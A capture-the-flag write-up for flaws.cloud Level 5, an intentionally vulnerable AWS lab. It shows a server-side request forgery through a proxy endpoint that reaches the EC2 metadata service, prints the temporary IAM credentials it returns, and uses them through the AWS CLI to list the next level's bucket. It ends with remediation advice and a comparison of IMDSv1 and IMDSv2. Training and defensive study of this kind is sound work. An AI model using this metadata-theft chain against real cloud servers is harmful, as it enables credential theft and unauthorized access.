# flaws.cloud Level 5

**Platform:** http://flaws.cloud  
**Category:** SSRF (Server-Side Request Forgery) + EC2 Metadata

## Vulnerability
The server had a proxy endpoint that fetched any URL without restriction,
allowing access to the EC2 metadata service (169.254.169.254) which
exposed temporary IAM credentials.

## Steps
1. Discovered proxy endpoint on the Level 5 server

\```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/
\```

2. Accessed EC2 metadata service through the proxy (SSRF)

\```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
\```

3. Retrieved temporary IAM credentials from the metadata response

\```json
{
  "AccessKeyId": "ASIA6GG7PSQG2VSTKMWO",
  "SecretAccessKey": "zO7Ssbut4Aftnd46kbKfCAutlItrxkIWXdD4koVA",
  "Token": "..."
}
\```

4. Configured AWS CLI with the stolen credentials

\```bash
aws configure --profile level5
aws configure set aws_session_token [TOKEN] --profile level5
\```

5. Used stolen credentials to access Level 6 bucket

\```bash
aws --profile level5 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
\```

## Key Takeaway
SSRF + EC2 metadata service is one of the most dangerous attack chains in AWS.
The proxy fetched any URL without filtering internal addresses,
allowing an external attacker to steal IAM credentials.
This is exactly how the 2019 Capital One breach occurred.

## How to Fix
- Block access to 169.254.169.254 in proxy/request functions
- Use IMDSv2 (requires session token, prevents SSRF attacks)
- Validate and whitelist URLs before making server-side requests
- Apply least privilege to EC2 IAM roles

## IMDSv1 vs IMDSv2

| | IMDSv1 | IMDSv2 |
|---|---|---|
| Request method | GET request only | PUT request required to obtain session token first |
| SSRF vulnerability | Vulnerable | Protected |
| Default | Legacy EC2 default | Recommended for all new EC2 instances |

IMDSv2 is resistant to SSRF attacks because SSRF typically only allows
GET requests, but IMDSv2 requires a PUT request first to obtain a session token.
Without the token, metadata cannot be accessed.